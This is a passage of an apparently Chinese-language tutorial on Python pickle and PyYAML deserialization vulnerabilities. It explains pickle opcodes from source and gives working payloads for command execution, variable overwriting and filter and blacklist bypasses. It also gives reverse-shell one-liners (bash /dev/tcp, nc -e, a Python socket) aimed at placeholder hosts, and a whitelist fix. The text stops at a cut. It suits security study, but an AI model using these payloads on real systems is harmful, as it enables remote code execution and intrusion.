如果协议版本大于4则使用_getattribute方法获取对象\n    if self.proto >= 4:\n        return _getattribute(sys.modules[module], name)[0]\n    # 否则使用getattr方法获取对象\n    else:\n        return getattr(sys.modules[module], name)\n\n# 与getattr类似\ndef _getattribute(obj, name):\n    # 将属性名按照点号（.）进行分割\n    for subpath in name.split('.'):\n        if subpath == '<locals>':\n            raise AttributeError(\"Can't get local attribute {!r} on {!r}\"\n                                 .format(name, obj))\n        try:\n            parent = obj\n            obj = getattr(obj, subpath)\n        except AttributeError:\n            raise AttributeError(\"Can't get attribute {!r} on {!r}\"\n                                 .format(name, obj)) from None\n    return obj, parent\n```\n\n**(**\n\n向栈中压入一个 MARK 标记\n\n源代码：\n\n```python\ndef load_mark(self):\n    # 将当前stack列表添加到metastack中，相当于标记\n    self.metastack.append(self.stack)\n    # 清空当前栈\n    self.stack = []\n    # 设置一个简化的append方法\n    self.append = self.stack.append\ndispatch[MARK[0]] = load_mark\n```\n\n**S**\n\n实例化一个字符串对象\n\n源代码：\n\n```python\ndef load_string(self):\n    # 读取一行数据，去除换行符\n    data = self.readline()[:-1]\n    # 去掉最外面的引号\n    if len(data) >= 2 and data[0] == data[-1] and data[0] in b'\"\\'':\n        data = data[1:-1]\n    else:\n        raise UnpicklingError(\"the STRING opcode argument must be quoted\")\n    # 对数据解码后添加到当前栈中\n    self.append(self._decode_string(codecs.escape_decode(data)[0]))\ndispatch[STRING[0]] = load_string\n\ndef _decode_string(self, value):\n    # Used to allow strings from Python 2 to be decoded either as\n    # bytes or Unicode strings.  This should be used only with the\n    # STRING, BINSTRING and SHORT_BINSTRING opcodes.\n    if self.encoding == \"bytes\":\n        return value\n    else:\n        return value.decode(self.encoding, self.errors)\n```\n\n**t**\n\n寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果\n\n源代码：\n\n```python\ndef load_tuple(self):\n    # 弹出当前栈中数据\n    items = self.pop_mark()\n    # 转成tuple类型并添加到还原后的栈中\n    self.append(tuple(items))\ndispatch[TUPLE[0]] = load_tuple\n\n\ndef pop_mark(self):\n    # 返回当前的stack到items\n    items = self.stack\n    # 从metastack还原之前的stack\n    self.stack = self.metastack.pop()\n    self.append = self.stack.append\n    return items\n```\n\n\n\n**R**\n\n从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈\n\n源代码：\n\n```python\ndef load_reduce(self):\n    stack = self.stack\n    # 第一个对象作为参数\n    args = stack.pop()\n    # 第二个对象作为函数\n    func = stack[-1]\n    # 调用func函数，并把结果赋给栈顶\n    stack[-1] = func(*args)\ndispatch[REDUCE[0]] = load_reduce\n```\n\n\n**.**\n\n程序结束，栈顶的一个元素作为 pickle.loads() 的返回值\n\n源代码：\n\n```python\n# 结束反序列化\ndef load_stop(self):\n    # 栈顶的值作为返回值\n    value = self.stack.pop()\n    raise _Stop(value)\ndispatch[STOP[0]] = load_stop\n```\n\n\n\n\n所以可以得到以下解释\n\nc后面跟的是模块名，换行之后的是类名，相当于将os.system放入栈中，然后放入一个标记符，接着将字符串 whoami 放入栈中，遇到t将栈中的数据弹出，一直到标记，并转为 tuple 再存入栈中，同时标记符消失，遇到R后将元组取出，作为参数放入函数中执行后将结果返回\n\n可以看作执行了`os.system('whoami')`\n\n![](/img/summary/python_unserialize-1.png)\n\n\n## pickletools\n\n当字节码很多的时候一个一个对着表去读会很麻烦，所以Python提供了pickletools工具，便于人工解读opcode\n\npickletools常用的有`pickletools.dis`和`pickletools.optimize`\n\n`pickletools.dis`：具有反汇编的功能，可以以可读性较强的方式展示一个序列化对象\n\n![](/img/summary/python_unserialize-2.png)\n\n\n`pickletools.optimize`：对一个序列化结果进行优化（消除未使用的 `PUT` 操作码）\n\n![](/img/summary/python_unserialize-3.png)\n\n\n\n\n# 常见利用思路\n\n漏洞产生原因是用户可控的反序列化入口点\n\n## 魔术方法 \\_\\_reduce\\_\\_()\n\n>PVM 的 操作码 R 就是 \\_\\_reduce\\_\\_() 的返回值的一个底层实现\n>与php中的__wakeup()方法类似，python在反序列化时会先调用__reduce__()魔术方法，所以我们可以利用这一特点触发恶意代码\n\n\n一个利用`__reduce__()`的例子，在能够传入可控的 pickle.loads 的 data 时就可以生效\n\n但是需要注意reduce一次只能执行一个函数\n\n```python\nimport pickle\nimport pickletools\nimport os\n\n# 注意python2与python3 之间的新式类与旧式类的区别，python2需要手动继承object\nclass Test(object):\n    def __reduce__(self):\n        shell = \"\"\"whoami\"\"\"          # 要执行的命令\n        return os.system, (shell,)    # reduce函数必须返回元组或字符串\n\n\ntest = Test()\na = pickle.dumps(test, protocol=0)\npickle.loads(a)\nprint(a)\npickletools.dis(pickletools.optimize(a))\n```\n\n![](/img/summary/python_unserialize-4.png)\n\n\n![](/img/summary/python_unserialize-5.png)\n\n\n## 全局变量覆盖\n\n>可以通过覆盖一些凭证达到绕过身份验证的目的\n\n\n```python\nimport pickle\nimport pickletools\n\nimport secret\n\nprint(\"变量的值为:\" + secret.key)\n\nopcode = b'''c__main__\nsecret\n(S'key'\nS'123'\ndb.'''\n\npickle.loads(opcode)\n\nprint(\"变量的值为:\" + secret.key)\npickletools.dis(opcode)\n```\n\n![](/img/summary/python_unserialize-6.png)\n\n\n\n## 全局变量引用\n\n```python\nimport pickle\nimport pickletools\nimport secret\n\nclass Target:\n    def __init__(self):\n        obj = pickle.loads(b'ccopy_reg\\n_reconstructor\\n(c__main__\\nTarget\\nc__builtin__\\nobject\\nNtR(dVpwd\\nVa\\nsb.')\n        if obj.pwd == secret.pwd:\n            print(\"Hello, admin!\")\n        else:\n            print(\"No\")\n\n\ntest = Target()\n```\n\n上面的例子中我们并不知道`secret.pwd`的值，要使if成立，可以使用`c`来实现\n\n`c`的作用是 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈\n\n```python\nb'ccopy_reg\\n_reconstructor\\n(c__main__\\nTarget\\nc__builtin__\\nobject\\nNtR(dVpwd\\nVaaa\\nsb.'\n\nb'ccopy_reg\\n_reconstructor\\n(c__main__\\nTarget\\nc__builtin__\\nobject\\nNtR(dVpwd\\ncsecret\\npwd\\nsb.'\n```\n\n![](/img/summary/python_unserialize-7.png)\n\n\n>与php反序列化中的`$this->b = &$this->a;`引用绕过类似，只不过python用的是import\n\n\n## 命令执行\n\npickle中用来构造函数执行的字节码有四个个：`R`、`i`、`o`以及`b +__setstate__()`\n\n### R\n\n[上文](#a)中提到的例子用的就是`R`来实现Rce\n\n>R: 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈\n\n```python\nopcode=b'''cos\nsystem\n(S'whoami'\ntR.'''\n```\n\n\n\n\n### i\n\n>相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）\n\n```python\ndef load_inst(self):\n    # 前三行代码与c的代码一致，用来调用\n    module = self.readline()[:-1].decode(\"ascii\")\n    name = self.readline()[:-1].decode(\"ascii\")\n    klass = self.find_class(module, name)\n    # 通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中\n    self._instantiate(klass, self.pop_mark())\ndispatch[INST[0]] = load_inst\n\n\ndef _instantiate(self, klass, args):\n    if (args or not isinstance(klass, type) or\n        hasattr(klass, \"__getinitargs__\")):\n        try:\n            value = klass(*args)\n        except TypeError as err:\n            raise TypeError(\"in constructor for %s: %s\" %\n                            (klass.__name__, str(err)), sys.exc_info()[2])\n    else:\n        value = klass.__new__(klass)\n    self.append(value)\n```\n\n\n```python\nopcode=b'''(S'whoami'\nios\nsystem\n.'''\n```\n\n### o\n\n>从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果\n\n```python\ndef load_obj(self):\n    # 弹出栈中所有数据赋值给args\n    args = self.pop_mark()\n    # 在args中弹出第一个作为类名\n    cls = args.pop(0)\n    # 利用_instantiate函数执行并将结果压回栈中\n    self._instantiate(cls, args)\ndispatch[OBJ[0]] = load_obj\n```\n\n\n```python\nopcode=b'''(cos\nsystem\nS'whoami'\no.'''\n```\n\n### b + \\_\\_setstate\\_\\_()\n\n\n>使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 \\_\\_setstate\\_\\_ 或 \\_\\_dict\\_\\_.update()\n\n\n```python\ndef load_build(self):\n    stack = self.stack\n    # 获取栈顶元素\n    state = stack.pop()\n    # 获取栈中倒数第二个元素\n    inst = stack[-1]\n    # 获取倒数第二个元素的__setstate__属性\n    setstate = getattr(inst, \"__setstate__\", None)\n\n    # setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它\n    # 一般不存在__setstate__方法，setstate(state)会造成任意函数调用\n    if setstate is not None:\n        setstate(state)\n        return\n    slotstate = None\n\n    # 如果state是元组类型且长度为2，则将其分解成state, slotstate\n    if isinstance(state, tuple) and len(state) == 2:\n        state, slotstate = state\n\n    if state:\n        inst_dict = inst.__dict__\n        intern = sys.intern\n        # 遍历state字典，将键名赋值给inst_dict，键值直接赋值\n        for k, v in state.items():\n            if type(k) is str:\n                inst_dict[intern(k)] = v\n            else:\n                inst_dict[k] = v\n\n    if slotstate:\n        # 遍历slotstate字典，并将其键值对赋值给inst对象\n        for k, v in slotstate.items():\n            setattr(inst, k, v)\ndispatch[BUILD[0]] = load_build\n```\n\n因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典`{\"__setstate__\":os.system}`，执行`b`。就会添加一个新的键值对，再继续压入命令，再执行`b`时，`setstate`就不会为None了，而是我们传入的os.system，就是`os.system(state)`，而state就是我们传入的命令，从而完成rce\n\n\n\n\n```python\nimport pickle\nimport pickletools\n\n\nclass Test(object):\n    def __init__(self, name):\n        self.name = \"aa\"\n\n\nopcode = b'''(c__main__\nTest\n)o(S\"__setstate__\"\ncos\nsystem\ndbS\"whoami\"\nb.'''\n\npickle.loads(opcode)\npickletools.dis(opcode)\n\n'''\nlewiserii\\lewiserii\n    0: (    MARK\n    1: c        GLOBAL     '__main__ Test'\n   16: )        EMPTY_TUPLE\n   17: o        OBJ        (MARK at 0)\n   18: (    MARK\n   19: S        STRING     '__setstate__'\n   35: c        GLOBAL     'os system'\n   46: d        DICT       (MARK at 18)\n   47: b    BUILD\n   48: S    STRING     'whoami'\n   58: b    BUILD\n   59: .    STOP\nhighest protocol among opcodes = 1\n'''\n```\n\n## 反弹shell\n\n既然可以执行命令了，那么肯定可以反弹shell了，以下是几种payload\n\n**利用i执行命令建立shell**\n\n```python\nimport base64\nimport pickle\n\npayload= b'''(S'python -c 'import os,pty,socket;s=socket.socket();s.connect((\"ip\", port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")''\nios\nsystem\n.'''\n\npayload2 = b'''(S'bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"'\nios\npopen\n.'''\n\nprint(base64.b64encode(pickle.dumps(payload)))\n```\n\n**reduce直接执行nc命令**\n\n```python\nimport base64\nimport pickle\n\nclass Test(object):\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('nc ip port -e/bin/sh')\",))\n\npayload = Test()\nprint(base64.b64encode(pickle.dumps(payload)))\n```\n\n\n# pker\n\n>[pker](https://github.com/eddieivan01/pker)是由eddieivan01编写的以遍历Python AST的形式来自动化解析pickle opcode的工具。\n\n\n\n# 漏洞修复 <a id=\"b\">\n\n对于pickle反序列化漏洞，常见的修复方法是重写Unpickler.find_class()来限制全局变量\n\n例如：\n\n```python\nimport builtins\nimport io\nimport pickle\n\n# 需要限制反序列化对象时可以使用的类\nsafe_builtins = {\n    'range',        # range类型\n    'complex',      # 复数类型\n    'set',          # 集合类型\n    'frozenset',    # 冻结集合类型\n    'slice',        # 切片类型\n}\n\n# 定义RestrictedUnpickler类继承自pickle.Unpickler\nclass RestrictedUnpickler(pickle.Unpickler):\n    #重写了find_class方法\n    def find_class(self, module, name):\n        # 如果被反序列化的对象的类属于builtins模块中的安全类，则返回该类\n        if module == \"builtins\" and name in safe_builtins:\n            return getattr(builtins, name)\n        # 如果不是安全类，就抛出异常，禁止反序列化\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %\n                                     (module, name))\n\n# 定义一个帮助函数restricted_loads来反序列化对象\ndef restricted_loads(s):\n    # 将传入的字符串s转换为bytes，并使用RestrictedUnpickler类反序列化\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n\nopcode=b\"cos\\nsystem\\n(S'echo hello world'\\ntR.\"\nrestricted_loads(opcode)\n\n\n###结果如下\nTraceback (most recent call last):\n...\n_pickle.UnpicklingError: global 'os.system' is forbidden\n```\n\n以上例子通过重写Unpickler.find_class()方法，限制调用模块只能为builtins，且函数必须在白名单内，否则抛出异常。\n\n\n\n\n\n# bypass\n\n## 关键字绕过\n\n>利用opcode进行变量覆盖时，代码中可能会过滤了我们想要覆盖的属性关键字\n\n\n例如\n\n```python\nimport pickle\nimport pickletools\nimport secret\n\nprint(\"变量的值为:\" + secret.key)\n\nif b'key' in opcode:\n    print('NoNoNo')\nelse:\n    pickle.loads(opcode)\n\nprint(\"变量的值为:\" + str(secret.key))\n```\n\n正常的opcode应该是\n\n```python\nopcode = b'''c__main__\nsecret\n(S'key'\nS'123'\ndb.'''\n```\n\n**方法一：十六进制**\n\n因为 S 操作符是可以识别十六进制的，所以这里也可以对字符进行十六进制编码来绕过\n\n```python\n# S'key' = S'\\x6B\\x65\\x79'\nimport pickle\nimport pickletools\nimport secret\n\nprint(\"变量的值为:\" + secret.key)\n\nopcode = b'''c__main__\nsecret\n(S'\\\\x6B\\\\x65\\\\x79'\nS'111'\ndb.'''\n\nif b'key' in opcode:\n    print('NoNoNo')\nelse:\n    pickle.loads(opcode)\n\nprint(\"变量的值为:\" + str(secret.key))\n\n\n'''\n变量的值为:123\n变量的值为:111\n'''\n```\n\n**方法二：unicode编码**\n\n同样的，V 操作符也可以识别unicode编码\n\n```python\n# S'key' = V\\u006b\\u0065\\u0079\nimport pickle\nimport pickletools\nimport secret\n\nprint(\"变量的值为:\" + secret.key)\n\nopcode = b'''c__main__\nsecret\n(V\\u006b\\u0065\\u0079\nS'111111'\ndb.'''\n\nif b'key' in opcode:\n    print('NoNoNo')\nelse:\n    pickle.loads(opcode)\n\nprint(\"变量的值为:\" + str(secret.key))\n\n\n'''\n变量的值为:123\n变量的值为:111111\n'''\n```\n\n\n**方法三：利用内置函数获取关键字**\n\n在python中，当我们导入某个模块后，可以通过`dir(sys.modules['xxx'])`来获取其全部属性\n\n例如\n\n```python\nimport secret\nimport sys\n\nprint(dir(sys.modules['secret']))\n\n'''\n['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'key']\n'''\n```\n\n但是因为pickle不持支列表索引和字典索引，所以需要用`reversed()+next()`来获取元素\n\n```python\nimport secret\nimport sys\n\nprint(next(reversed(dir(sys.modules['secret']))))\n\n'''\nkey\n'''\n```\n\n转换成opcode\n\n```python\n# 构造出dir\nopcode=b'''(c__main__\nsecret\ni__builtin__\ndir\n.'''\n```\n\n\n```python\n# 构造reversed\nopcode=b'''((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\n.'''\n```\n\n\n```python\n# 构造next\nopcode=b'''(((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\n.'''\n```\n\n```python\n# 变量覆盖\nimport pickle\nimport pickletools\nimport secret\n\nprint(\"变量的值为:\" + secret.key)\n\nopcode=b'''c__main__\nsecret\n((((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\nS'111'\ndb.'''\n\nif b'key' in opcode:\n    print('NoNoNo')\nelse:\n    pickle.loads(opcode)\n\nprint(\"变量的值为:\" + str(secret.key))\n\n\n'''\n变量的值为:123\n变量的值为:111\n'''\n```\n\n\n\n\n## 绕过builtins\n\n对于[上文](#b)提到的重写find_class()方法来限制调用模块，如果采用的是黑名单的方式，那么就有可能绕过其限制\n\n例如[code-breaking 2018 picklecode](https://github.com/phith0n/code-breaking/tree/master/2018/picklecode)\n\n```python\nimport pickle\nimport io\nimport builtins\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}\n\n    def find_class(self, module, name):\n        # Only allow safe classes from builtins.\n        if module == \"builtins\" and name not in self.blacklist:\n            return getattr(builtins, name)\n        # Forbid everything else.\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %\n                                     (module, name))\n\ndef restricted_loads(s):\n    \"\"\"Helper function analogous to pickle.loads().\"\"\"\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n```\n\n同样是限制了使用的模块只能为builtins，加上一个黑名单。但是我们可以利用`getattr`来获取一些黑名单函数，例如`builtins.getattr('builtins', 'eval')`\n\n转换成payload：`builtins.getattr(builtins, 'eval'),('__import__(\"os\").system(\"whoami\")',)`\n\n然后开始手搓opcode\n\n首先调用builtins.getattr\n\n```python\ncbuiltins\ngetattr\n```\n\n然后注意不能直接压入builtins，需要构造出一个builtins模块再来传给getattr\n\n例如可以从`builtins.globals()`中拿到builtins模块，但是因为返回值是`<class 'dict'>`，所以还需要一个`builtins.dict`中的get函数来取出`builtins`\n\n变换后的payload：`builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins'),'eval')('__import__(\"os\").system(\"whoami\")',)`\n\n\n继续编写opcode\n\n```python\n#构造出get函数\nimport pickle\nimport pickletools\n\nopcode = b'''cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR.\n'''\n\npickletools.dis(opcode)\nprint(pickle.loads(opcode))\n\n'''\n    0: c    GLOBAL     'builtins getattr'\n   18: (    MARK\n   19: c        GLOBAL     'builtins dict'\n   34: S        STRING     'get'\n   41: t        TUPLE      (MARK at 18)\n   42: R    REDUCE\n   43: .    STOP\nhighest protocol among opcodes = 0\n<method 'get' of 'dict' objects>\n'''\n```\n\n\n```python\n# 获取globals()字典\nimport pickle\nimport pickletools\n\nopcode = b'''cbuiltins\nglobals\n)R.\n'''\n\npickletools.dis(opcode)\nprint(pickle.loads(opcode))\n\n'''\n    0: c    GLOBAL     'builtins globals'\n   18: )    EMPTY_TUPLE\n   19: R    REDUCE\n   20: .    STOP\nhighest protocol among opcodes = 1\n{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000002490202C9D0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'C:\\\\Users\\\\lewiserii\\\\Desktop\\\\test\\\\2.py', '__cached__': None, 'pickle': <module 'pickle' from 'C:\\\\Python\\\\Python311\\\\Lib\\\\pickle.py'>, 'pickletools': <module 'pickletools' from 'C:\\\\Python\\\\Python311\\\\Lib\\\\pickletools.py'>, 'opcode': b'cbuiltins\\nglobals\\n)R.\\n'}\n'''\n```\n\n\n```python\n# 组合get()和globals()字典，获取builtins模块\nimport pickle\nimport pickletools\n\nopcode = b'''cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n)RS'__builtins__'\ntR.'''\n\npickletools.dis(opcode)\nprint(pickle.loads(opcode))\n\n'''\n    0: c    GLOBAL     'builtins getattr'\n   18: (    MARK\n   19: c        GLOBAL     'builtins dict'\n   34: S        STRING     'get'\n   41: t        TUPLE      (MARK at 18)\n   42: R    REDUCE\n   43: (    MARK\n   44: c        GLOBAL     'builtins globals'\n   62: )        EMPTY_TUPLE\n   63: R        REDUCE\n   64: S        STRING     '__builtins__'\n   80: t        TUPLE      (MARK at 43)\n   81: R    REDUCE\n   82: .    STOP\nhighest protocol among opcodes = 1\n<module 'builtins' (built-in)>\n'''\n```\n\n\n```python\n# 获取eval\nimport pickle\nimport pickletools\n\nopcode=b'''cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n)RS'__builtins__'\ntRS'eval'\ntR.'''\n\npickletools.dis(opcode)\nprint(pickle.loads(opcode))\n\n'''\n    0: c    GLOBAL     'builtins getattr'\n   18: (    MARK\n   19: c        GLOBAL     'builtins getattr'\n   37: (        MARK\n   38: c            GLOBAL     'builtins dict'\n   53: S            STRING     'get'\n   60: t            TUPLE      (MARK at 37)\n   61: R        REDUCE\n   62: (        MARK\n   63: c            GLOBAL     'builtins globals'\n   81: )            EMPTY_TUPLE\n   82: R            REDUCE\n   83: S            STRING     '__builtins__'\n   99: t            TUPLE      (MARK at 62)\n  100: R        REDUCE\n  101: S        STRING     'eval'\n  109: t        TUPLE      (MARK at 18)\n  110: R    REDUCE\n  111: .    STOP\nhighest protocol among opcodes = 1\n<built-in function eval>\n'''\n```\n\n```python\n# 执行命令\nimport pickle\nimport pickletools\n\nopcode=b'''cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n)RS'__builtins__'\ntRS'eval'\ntR(S'__import__(\"os\").system(\"whoami\")'\ntR.\n'''\n\npickletools.dis(opcode)\nprint(pickle.loads(opcode))\n\n'''\n    0: c    GLOBAL     'builtins getattr'\n   18: (    MARK\n   19: c        GLOBAL     'builtins getattr'\n   37: (        MARK\n   38: c            GLOBAL     'builtins dict'\n   53: S            STRING     'get'\n   60: t            TUPLE      (MARK at 37)\n   61: R        REDUCE\n   62: (        MARK\n   63: c            GLOBAL     'builtins globals'\n   81: )            EMPTY_TUPLE\n   82: R            REDUCE\n   83: S            STRING     '__builtins__'\n   99: t            TUPLE      (MARK at 62)\n  100: R        REDUCE\n  101: S        STRING     'eval'\n  109: t        TUPLE      (MARK at 18)\n  110: R    REDUCE\n  111: (    MARK\n  112: S        STRING     '__import__(\"os\").system(\"whoami\")'\n  149: t        TUPLE      (MARK at 111)\n  150: R    REDUCE\n  151: .    STOP\nhighest protocol among opcodes = 1\nlewiserii\\lewiserii\n0\n'''\n```\n\n```python\n# 不使用R字节码\nimport pickle\nimport pickletools\n\nopcode = b'\\x80\\x03(cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00getop2\\n0(g2\\n(cbuiltins\\nglobals\\noX\\x0C\\x00\\x00\\x00__builtins__op3\\n(g0\\ng3\\nX\\x04\\x00\\x00\\x00evalop4\\n(g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")o00.'\n\npickletools.dis(pickletools.optimize(opcode))\npickle.loads(opcode)\n\n'''\n    0: \\x80 PROTO      3\n    2: (    MARK\n    3: c        GLOBAL     'builtins getattr'\n   21: q        BINPUT     0\n   23: c        GLOBAL     'builtins dict'\n   38: X        BINUNICODE 'get'\n   46: o        OBJ        (MARK at 2)\n   47: q    BINPUT     1\n   49: 0    POP\n   50: (    MARK\n   51: h        BINGET     1\n   53: (        MARK\n   54: c            GLOBAL     'builtins globals'\n   72: o            OBJ        (MARK at 53)\n   73: X        BINUNICODE '__builtins__'\n   90: o        OBJ        (MARK at 50)\n   91: q    BINPUT     2\n   93: (    MARK\n   94: h        BINGET     0\n   96: h        BINGET     2\n   98: X        BINUNICODE 'eval'\n  107: o        OBJ        (MARK at 93)\n  108: q    BINPUT     3\n  110: (    MARK\n  111: h        BINGET     3\n  113: X        BINUNICODE '__import__(\"os\").system(\"whoami\")'\n  151: o        OBJ        (MARK at 110)\n  152: 0    POP\n  153: 0    POP\n  154: .    STOP\nhighest protocol among opcodes = 2\nlewiserii\\lewiserii\n'''\n```\n\n\n## opcode版本\n\n有时可以通过改变opcode的版本来绕过一些对字母的过滤\n\n![](/img/summary/python_unserialize-8.png)\n\n\n\n# PyYAML 反序列化\n\n## 基础语法规则\n\n1：大小写敏感\n\n2：使用空格代替tab键缩进表示层级，对齐即可表示同级\n\n3：和python一样使用'#'注释内容\n\n4：!!表示强制类型转换\n\n5：一个 .yml 文件中可以有多份配置文件，用 --- 隔开\n\n更多的语法规则可以看[官方手册](https://pyyaml.org/wiki/PyYAMLDocumentation)或[菜鸟教程](https://www.runoob.com/w3cnote/yaml-intro.html)等\n\n\n## 类型转换\n\n在PyYAML中，可以通过 `!!` 来进行类型转换\n\n![](/img/summary/python_unserialize-9.png)\n\n\n`site-packages/yaml/constructor.py`中可以看到基础的类型转换过程\n\n\n例如\n\n```python\n# python2\n# PyYAML4.2b4\nimport yaml\ndata = yaml.load('!!str 111')\nprint(data)\nprint(type(data))\n\n'''\n111\n<type 'str'>\n'''\n```\n\n对应的代码如下，add_constructor定义了一些基础的类型转换\n\n```python\nSafeConstructor.add_constructor(\n        u'tag:yaml.org,2002:str',\n        SafeConstructor.construct_yaml_str)\n```\n\n```python\ndef add_constructor(cls, tag, constructor):\n    if not 'yaml_constructors' in cls.__dict__:\n        cls.yaml_constructors = cls.yaml_constructors.copy()\n    cls.yaml_constructors[tag] = constructor\nadd_constructor = classmethod(add_constructor)\n```\n\nstr对应的函数是 construct_yaml_str，下断点分析\n\n\n```python\ndef construct_yaml_str(self, node):\n    value = self.construct_scalar(node)\n    try:\n        return value.encode('ascii')\n    except UnicodeEncodeError:\n        return value\n```\n\n```python\ndef construct_scalar(self, node):\n    if isinstance(node, MappingNode):\n        for key_node, value_node in node.value:\n            if key_node.tag == u'tag:yaml.org,2002:value':\n                return self.construct_scalar(value_node)\n    return BaseConstructor.construct_scalar(self, node)\n```\n\n```python\ndef construct_scalar(self, node):\n    if not isinstance(node, ScalarNode):\n        raise ConstructorError(None, None,\n                \"expected a scalar node, but found %s\" % node.id,\n                node.start_mark)\n    return node.value\n```\n\n可以看到转换的过程，包括node的值\n\n![](/img/summary/python_unserialize-10.png)\n\n\n当然除了`add_constructor`定义的基础类型外还有`add_multi_constructor`定义的5个complex python tag\n\n```python\nConstructor.add_multi_constructor(\n    u'tag:yaml.org,2002:python/name:',\n    Constructor.construct_python_name)\n\nConstructor.add_multi_constructor(\n    u'tag:yaml.org,2002:python/module:',\n    Constructor.construct_python_module)\n\nConstructor.add_multi_constructor(\n    u'tag:yaml.org,2002:python/object:',\n    Constructor.construct_python_object)\n\nConstructor.add_multi_constructor(\n    u'tag:yaml.org,2002:python/object/apply:',\n    Constructor.construct_python_object_apply)\n\nConstructor.add_multi_constructor(\n    u'tag:yaml.org,2002:python/object/new:',\n    Constructor.construct_python_object_new)\n```\n\n根据图表可以看到这几个都可以引入新的模块，这正是 PyYAML 存在反序列化漏洞的原因\n\n## PyYAML < 5.1\n\nPyYAML 的利用划分以版本 5.1 为界限，5.1以下利用相对较简单，5.1以上利用相对稍麻烦\n\n<5.1的版本中一共有三个构造器，分别是\n\n```text\nBaseConstructor：最最基础的构造器，不支持强制类型转换\nSafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改\nConstructor：在 YAML 规范上新增了很多强制类型转换，是默认使用的构造器\n```\n\n\n### python/object/apply\n\nconstruct_python_object_apply\n\n```python\ndef construct_python_object_apply(self, suffix, node, newobj=False):\n        # Format:\n        #   !!python/object/apply       # (or !!python/object/new)\n        #   args: [ ... arguments ... ]\n        #   kwds: { ... keywords ... }\n        #   state: ... state ...\n        #   listitems: [ ... listitems ... ]\n        #   dictitems: { ... dictitems ... }\n        # or short format:\n        #   !!python/object/apply [ ... arguments ... ]\n        # The difference between !!python/object/apply and !!python/object/new\n        # is how an object is created, check make_python_instance for details.\n        if isinstance(node, SequenceNode):\n            args = self.construct_sequence(node, deep=True)\n            kwds = {}\n            state = {}\n            listitems = []\n            dictitems = {}\n        else:\n            value = self.construct_mapping(node, deep=True)\n            args = value.get('args', [])\n            kwds = value.get('kwds', {})\n            state = value.get('state', {})\n            listitems = value.get('listitems', [])\n            dictitems = value.get('dictitems', {})\n        # 调用 make_python_instance 获取模块中的方法并执行\n        instance = self.make_python_instance(suffix, node, args, kwds, newobj)\n        if state:\n            self.set_python_instance_state(instance, state)\n        if listitems:\n            instance.extend(listitems)\n        if dictitems:\n            for key in dictitems:\n                instance[key] = dictitems[key]\n        return instance\n```\n\n调用 make_python_instance 获取模块中的方法并执行\n\n![](/img/summary/python_unserialize-11.png)\n\n\npayload\n\n```python\n# short format形式\n# !!python/object/apply [ ... arguments ... ]\nyaml.load('!!python/object/apply:os.system [\"whoami\"]')\nyaml.load(\"!!python/object/apply:os.system ['whoami']\")\nyaml.load(\"!!python/object/apply:os.system [whoami]\")\nyaml.load(\"!!python/object/apply:subprocess.Popen ['whoami']\")\n\n\n# 其他几种表现形式\nyaml.load(\"exp: !!python/object/apply:os.system [whoami]\")\n\nyaml.load(\"\"\"\nexp: !!python/object/apply:os.system\n- whoami\n\"\"\")\n\nyaml.load(\"\"\"\nexp: !!python/object/apply:os.system\n  args: [\"whoami\"]\n\"\"\")\n\n# command 是 os.system 的参数名(可以通过help(os.system)查看)\nyaml.load(\"\"\"\nexp: !!python/object/apply:os.system\n  kwds: {\"command\": \"whoami\"}\n\"\"\")\n\nyaml.load(\"\"\"\n!!python/object/apply:os.system\n- whoami\n\"\"\")\n```\n\n### python/object/new\n\n对应的 construct_python_object_new 只有一行代码，调用了construct_python_object_apply\n\n```python\ndef construct_python_object_new(self, suffix, node):\n    return self.construct_python_object_apply(suffix, node, newobj=True)\n```\n\n唯一不同的是newobj参数不一样，这个参数影响了 make_python_instance 中的一个判断\n\n```python\nif newobj and isinstance(cls, type):\n    return cls.__new__(cls, *args, **kwds)\nelse:\n    return cls(*args, **kwds)\n```\n\n基本不影响，所以 python/object/new 和 python/object/apply 可以看作是同一个\n\n\n\n### 